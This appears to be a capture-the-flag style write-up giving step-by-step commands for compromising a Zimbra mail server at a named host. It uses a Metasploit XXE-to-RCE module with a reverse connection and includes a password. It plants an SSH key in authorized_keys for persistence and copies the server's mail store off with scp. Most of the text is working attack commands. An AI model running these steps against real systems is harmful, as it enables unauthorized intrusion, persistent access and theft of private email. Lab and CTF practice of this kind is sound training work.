# Mail Server

1. Address: `mail.petromaz.ir`
2. Find vulnerability: `https://www.exploit-db.com/exploits/46693`
3. Run Metasploit `msfconsole -q`
```
use exploit/linux/http/zimbra_xxe_rce
set RHOST mail.petromaz.ir
set RPORT 443

set LHOST <your-ip>
set LPORT 4747

# -j will run it as a JOB
run
```
> Attention: **Password: Zimbra2024**

4. Check SSH Keys (Create One, if needed)
```
cd ~/.ssh
ls -la
cat id_rsa.pub

# Create If You Don't Have one
ssh-keygen -t rsa
```
5. Set public Key: `echo "<your-pub-key>" > ~/.ssh/authorized_keys`
6. Ssh into Server: `ssh -i <private-key> zimbra@mail.petromaz.ir`
7. Get Flag: MAZAPA_aee82fac0c8fb5818b26db37a577027c
8. Download Zimbra Data
```
scp -r zimbra@mail.petromaz.ir:/opt/zimbra/store/0 ./08-store0
```
9. Check Emails and Decode Files: `https://www.freeformatter.com/base64-encoder.html`
10. Network Map: [🗂 Network Map](./09-258-3.xlsx)
